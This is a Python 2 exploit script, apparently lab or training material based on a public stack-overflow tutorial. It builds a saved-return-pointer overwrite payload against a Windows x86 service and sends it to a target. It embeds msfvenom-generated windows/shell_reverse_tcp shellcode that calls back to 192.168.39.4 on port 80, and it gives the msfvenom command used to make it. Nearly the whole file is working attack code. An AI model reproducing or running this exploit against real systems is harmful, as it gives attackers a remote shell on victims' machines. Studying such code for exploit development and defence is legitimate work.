#!/usr/bin/env python

# Windows x86 reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import struct, functions

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()
offset_srp = functions.getOffsetSrp()
ptr_jmp_esp = functions.getPtrJmpEsp()

print "RHOST=%s; RPORT=%s; buf_totlen=%s; offset_srp=%s; ptr_jmp_esp=%s" % (RHOST, RPORT, buf_totlen, offset_srp, hex(ptr_jmp_esp))

# instead of using NOPs, drag ESP up the stack to avoid GetPC issues
# note: when modifying ESP, always ensure that it remains divisible by 4
sub_esp_10 = "\x83\xec\x10"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.39.4 LPORT=80 EXITFUNC=thread -v shellcode -b '\x00\x0a\x0d' -f python
shellcode =  ""
shellcode += "\xdb\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\xbd"
shellcode += "\xc2\x9b\x16\xd0\x83\xc2\x04\x31\x6a\x13\x03\xa8"
shellcode += "\x88\xf4\x25\xd0\x47\x7a\xc5\x28\x98\x1b\x4f\xcd"
shellcode += "\xa9\x1b\x2b\x86\x9a\xab\x3f\xca\x16\x47\x6d\xfe"
shellcode += "\xad\x25\xba\xf1\x06\x83\x9c\x3c\x96\xb8\xdd\x5f"
shellcode += "\x14\xc3\x31\xbf\x25\x0c\x44\xbe\x62\x71\xa5\x92"
shellcode += "\x3b\xfd\x18\x02\x4f\x4b\xa1\xa9\x03\x5d\xa1\x4e"
shellcode += "\xd3\x5c\x80\xc1\x6f\x07\x02\xe0\xbc\x33\x0b\xfa"
shellcode += "\xa1\x7e\xc5\x71\x11\xf4\xd4\x53\x6b\xf5\x7b\x9a"
shellcode += "\x43\x04\x85\xdb\x64\xf7\xf0\x15\x97\x8a\x02\xe2"
shellcode += "\xe5\x50\x86\xf0\x4e\x12\x30\xdc\x6f\xf7\xa7\x97"
shellcode += "\x7c\xbc\xac\xff\x60\x43\x60\x74\x9c\xc8\x87\x5a"
shellcode += "\x14\x8a\xa3\x7e\x7c\x48\xcd\x27\xd8\x3f\xf2\x37"
shellcode += "\x83\xe0\x56\x3c\x2e\xf4\xea\x1f\x27\x39\xc7\x9f"
shellcode += "\xb7\x55\x50\xec\x85\xfa\xca\x7a\xa6\x73\xd5\x7d"
shellcode += "\xc9\xa9\xa1\x11\x34\x52\xd2\x38\xf3\x06\x82\x52"
shellcode += "\xd2\x26\x49\xa2\xdb\xf2\xde\xf2\x73\xad\x9e\xa2"
shellcode += "\x33\x1d\x77\xa8\xbb\x42\x67\xd3\x11\xeb\x02\x2e"
shellcode += "\xf2\xd4\x7b\x17\x06\xbd\x79\x57\x06\x6d\xf7\xb1"
shellcode += "\x6c\x9d\x51\x6a\x19\x04\xf8\xe0\xb8\xc9\xd6\x8d"
shellcode += "\xfb\x42\xd5\x72\xb5\xa2\x90\x60\x22\x43\xef\xda"
shellcode += "\xe5\x5c\xc5\x72\x69\xce\x82\x82\xe4\xf3\x1c\xd5"
shellcode += "\xa1\xc2\x54\xb3\x5f\x7c\xcf\xa1\x9d\x18\x28\x61"
shellcode += "\x7a\xd9\xb7\x68\x0f\x65\x9c\x7a\xc9\x66\x98\x2e"
shellcode += "\x85\x30\x76\x98\x63\xeb\x38\x72\x3a\x40\x93\x12"
shellcode += "\xbb\xaa\x24\x64\xc4\xe6\xd2\x88\x75\x5f\xa3\xb7"
shellcode += "\xba\x37\x23\xc0\xa6\xa7\xcc\x1b\x63\xc7\x2e\x89"
shellcode += "\x9e\x60\xf7\x58\x23\xed\x08\xb7\x60\x08\x8b\x3d"
shellcode += "\x19\xef\x93\x34\x1c\xab\x13\xa5\x6c\xa4\xf1\xc9"
shellcode += "\xc3\xc5\xd3"

buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += struct.pack("<I", ptr_jmp_esp)   # SRP overwrite
buf += sub_esp_10                       # ESP points here
buf += shellcode
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# print buf

sent = functions.sendBuffer(RHOST, RPORT, buf)

if sent is 0:
    print "Caught reverse shell?"
